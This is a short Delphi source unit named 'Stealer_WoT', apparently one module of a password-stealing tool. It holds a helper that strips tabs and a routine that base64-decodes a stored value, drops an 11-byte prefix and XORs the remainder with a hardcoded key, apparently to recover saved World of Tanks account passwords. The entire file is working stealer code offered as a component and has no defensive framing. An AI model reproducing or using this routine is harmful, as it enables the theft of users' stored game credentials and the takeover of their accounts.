unit Stealer_WoT;

interface

uses
  Sysutils,Windows,EncdDecd;

function WoTDecrypt(const pwd:string): String;
function WoTTrim(s:string):string;

implementation

function WoTTrim(s:string):string;
var
  i:integer;
begin
  result:='';
  if length(s)=0 then exit;
  for i:=1 to length(s) do
  begin
    if (s[i]<>#09) then result:=result+s[i];
  end;
end;

function WoTDecrypt(const pwd:string): String;
var
  i:integer;
  key,trimd,decd,todecrypt:string;
  b1,b2:byte;
begin
  result:='';
  if length(pwd)=0 then exit;
  trimd:=WoTTrim(pwd);
  key:='Al4fgExk';
  decd:=DecodeString(trimd);
  if length(decd)<=11 then exit;
  todecrypt:=copy(decd,12,length(decd)-11);
  for i:=0 to length(todecrypt)-1 do
  begin
    b1:=ord(todecrypt[i+1]);
    b2:=ord(key[i mod length(key) +1]);
    result:=result+chr((b1) xor b2);
  end;
end;

end.
